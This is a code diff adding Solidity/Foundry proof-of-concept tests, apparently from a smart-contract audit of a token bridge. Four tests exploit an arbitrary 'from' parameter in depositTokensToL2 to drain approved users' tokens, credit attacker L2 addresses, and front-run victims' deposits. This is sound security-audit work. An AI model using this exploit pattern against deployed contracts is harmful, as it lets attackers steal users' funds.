@@ -224,3 +224,101 @@ contract L1BossBridgeTest is Test {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
 }
+
+contract AttackVectorPoCTests is L1BossBridgeTest {
+    address attacker = makeAddr("attacker");
+    address attackerInL2 = makeAddr("attackerInL2");
+
+    /**
+     * @notice Attack Vector1: Direct Approver Balance Theft
+     * @dev An attacker calls depositTokensToL2 specifying a victim who approved the bridge; The victim's tokens are pulled without their consent.
+     */
+    function test_poc_attackVector1_directApproverBalanceTheft() public{
+        uint256 victimBalance = token.balanceOf(address(user));
+
+        // Victim approves the bridge for bridging operations (e.g., unlimited approval)
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        assertEq(token.balanceOf(user), victimBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+
+        // Attacker observes user's approval and drains their entire balance
+        vm.prank(attacker);
+        tokenBridge.depositTokensToL2(user, attackerInL2, victimBalance);
+
+        // Victim is completely drained; vault holds the stolen funds
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), victimBalance);
+    }
+
+    /**
+     * @notice Attack vector 2: Infinite L2 Mint/Double Dip
+     * @dev The attacker uses victim funds to trigger a valid Deposit event crediting attackerInL2. The off-chain relayer will mint L2 tokens to the attacker.
+     */
+    function test_poc_attackVector2_unbackedL2MintForAttacker() public {
+        uint256 stolenAmount = 500e18;
+
+        // Victim approves bridge
+        vm.prank(user);
+        token.approve(address(tokenBridge), stolenAmount);
+
+        // Attacker triggers deposit using victim's address as `from` and attackerInL2 as 'l2Recipient'
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attackerInL2, stolenAmount);
+
+        vm.prank(attacker);
+        tokenBridge.depositTokensToL2(user, attackerInL2, stolenAmount);
+
+        // Attacker has successfully routed L2 minting credits to themselves using victim's tokens
+        assertEq(token.balanceOf(user), 1000e18 - stolenAmount);
+        assertEq(token.balanceOf(address(vault)), stolenAmount);
+    }
+
+    /**
+     * @notice Attack Vector 3: Mempool Front-Running/MEV Sniping
+     * @dev Victim submits approval and deposit. Attacker detects approval in mempool and front-runs victim's deposit call, causing victim's transaction to fail.
+     */
+    function test_poc_attackVector3_mempoolFrontRunning() public {
+        uint256 depositAmount = 100e18;
+
+        // Step 1: Victim approves tokens on L1 (Transaction 1)
+        vm.prank(user);
+        token.approve(address(tokenBridge), depositAmount);
+
+        // Step 2: Attacker spots victim's approval in mempool and front-runs victim's deposit (Transaction 2a)
+        vm.prank(attacker);
+        tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);
+
+        // Step 3: Victim's original deposit transaction executes next and reverts due to exhausted allowance (Transaction 2b)
+        vm.prank(user);
+        vm.expectRevert();
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+    }
+
+    /**
+     * @notice Attack Vector 4: Vault & User Liquidity Exhaustion
+     * @dev Attacker iterates over multiple approved users and sweeps all liquidity into vault under attacker-controlled L2 recipients, monopolizing vault claims.
+     */
+    function test_poc_attackVector4_vaultAndLiquidityExhaustion() public {
+        address victim2 = makeAddr("victim2");
+
+        // Deal tokens directly to victim2
+        deal(address(token), victim2, 500e18);
+
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        vm.prank(victim2);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        vm.startPrank(attacker);
+        tokenBridge.depositTokensToL2(user, attackerInL2, token.balanceOf(user));
+        tokenBridge.depositTokensToL2(victim2, attackerInL2, token.balanceOf(victim2));
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(victim2), 0);
+        assertEq(token.balanceOf(address(vault)), 1500e18);
+    }
+}
